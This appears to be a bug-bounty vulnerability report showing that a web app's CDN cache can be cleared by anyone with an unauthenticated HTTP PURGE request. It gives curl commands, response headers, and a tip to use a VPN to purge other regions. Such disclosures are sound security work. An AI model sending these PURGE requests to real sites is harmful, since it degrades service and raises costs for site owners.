
# Not authenticated Cache purges

## Summary
Is possible to use the HTTP method PURGE to clean the web app caches. That can lead to increased bandwidth costs, slower response time to users and potential Denial of Service attacks.

## Steps To Reproduce


Let's run 100 requests to see the cache hits: 

```
for v in `seq  100 ` ; do curl -s -Ik $URL ; done

HTTP/2 200 
cache-control: max-age=3600
content-type: text/html; charset=utf-8
etag: "b2b7b4a58b41dd1d56b7124542d806b2bc3d1e343306f0b6e720666eabe9330d"
last-modified: Fri, 16 Apr 2021 06:01:22 GMT
strict-transport-security: max-age=31556926; includeSubDomains; preload
accept-ranges: bytes
date: Sun, 18 Apr 2021 06:01:17 GMT
x-served-by: cache-scl19423-SCL
x-cache: HIT
x-cache-hits: 12
x-timer: S1618725677.340217,VS0,VE0
vary: x-fh-requested-host, accept-encoding
content-length: 2828

HTTP/2 200 
cache-control: max-age=3600
content-type: text/html; charset=utf-8
etag: "b2b7b4a58b41dd1d56b7124542d806b2bc3d1e343306f0b6e720666eabe9330d"
last-modified: Fri, 16 Apr 2021 06:01:22 GMT
strict-transport-security: max-age=31556926; includeSubDomains; preload
accept-ranges: bytes
date: Sun, 18 Apr 2021 06:01:17 GMT
x-served-by: cache-scl19425-SCL
x-cache: HIT
x-cache-hits: 14
x-timer: S1618725678.523580,VS0,VE0
vary: x-fh-requested-host, accept-encoding
content-length: 2828

```
Depending on the cache server responding, the value of x-cache-hits goes between 12 and 29, you might get slightly different results. 

Then, we can PURGE the cache from all servers. 

```
curl -X PURGE $URL
{ "status": "ok", "id": "19425-1618472452-15224" }
```
x-cache-hits is now 0 

```
HTTP/2 200 
cache-control: max-age=3600
content-type: text/html; charset=utf-8
etag: "b2b7b4a58b41dd1d56b7124542d806b2bc3d1e343306f0b6e720666eabe9330d"
last-modified: Fri, 16 Apr 2021 06:01:22 GMT
strict-transport-security: max-age=31556926; includeSubDomains; preload
accept-ranges: bytes
date: Sun, 18 Apr 2021 06:05:33 GMT
x-served-by: cache-scl19421-SCL
x-cache: MISS
x-cache-hits: 0
x-timer: S1618725933.432825,VS0,VE233
vary: x-fh-requested-host, accept-encoding
content-length: 2828

```
The cache server is assigned based on the IP address, is very simple to use a VPN to PURGE caches in different geo regions. 

### Supporting Material/References:
* https://hackerone.com/reports/154278



